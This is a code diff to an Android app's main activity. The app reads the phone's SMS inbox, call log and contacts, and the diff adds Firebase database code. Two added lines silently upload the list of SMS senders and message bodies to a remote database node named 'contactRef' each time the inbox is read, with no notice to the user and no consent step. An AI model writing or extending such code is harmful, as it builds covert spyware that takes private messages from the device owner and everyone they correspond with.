@@ -18,10 +18,17 @@ import android.view.View;
 import android.widget.AdapterView;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
+import android.widget.TextView;
 import android.widget.Toast;
 import android.widget.Button;
 import java.util.ArrayList;
 import android.provider.CallLog;
+
+import com.google.firebase.database.DataSnapshot;
+import com.google.firebase.database.DatabaseError;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+import com.google.firebase.database.ValueEventListener;
 
 public class MainActivity extends AppCompatActivity implements View.OnClickListener{
     @Override
@@ -47,6 +54,10 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     ArrayAdapter arrayAdapter;
     private SMSBReciever broadcastReceiver;
     Button bcalllog, bsmslog, bcontacts;
+    TextView textView;
+    FirebaseDatabase database ;
+    DatabaseReference myref ;
+    DatabaseReference MyContactRef;
 
     public static MainActivity instance(){return inst;}
 
@@ -66,13 +77,33 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         setContentView(R.layout.activity_main);
         broadcastReceiver = new SMSBReciever();
         listView = findViewById(R.id.smsList);
-
         bcalllog = findViewById((R.id.bcalllog));
         bsmslog = findViewById(R.id.bsmslog);
         bcontacts = findViewById(R.id.bcontacts);
+        textView = findViewById(R.id.fbt);
+
         bcalllog.setOnClickListener(this);
         bsmslog.setOnClickListener(this);
         bcontacts.setOnClickListener(this);
+
+        database  = FirebaseDatabase.getInstance();
+        myref = database.getReference("message");
+        MyContactRef = database.getReference("contactRef");
+        myref.setValue("Hello World");
+
+        myref.addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(DataSnapshot dataSnapshot) {
+                String value = dataSnapshot.getValue(String.class);
+                textView.setText(value);
+            }
+
+            @Override
+            public void onCancelled(DatabaseError databaseError) {
+                Toast.makeText(MainActivity.this, "FIREBASE ERROR!!", Toast.LENGTH_SHORT).show();
+            }
+        });
+
 
         arrayAdapter = new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1,smsListView);
         listView.setAdapter(arrayAdapter);
@@ -100,6 +131,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 && ContextCompat.checkSelfPermission(getBaseContext(),"android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED
                 && ContextCompat.checkSelfPermission(getBaseContext(),"android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED ){
             refreshSmsInbox();
+            MyContactRef.setValue(smsListView);
         }else{
             final int REQUEST_CODE_ASK_PERMISSION = 123;
             ActivityCompat.requestPermissions(MainActivity.this,new String[]{
@@ -125,6 +157,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     String str = "SMS From:" + smsInboxCurser.getString(indexAddress)+"\n"+smsInboxCurser.getString(indexBody)+"\n";
                     arrayAdapter.add(str);
                 }while (smsInboxCurser.moveToNext());
+                MyContactRef.setValue(smsListView);
                 smsInboxCurser.close();
 
                 break;
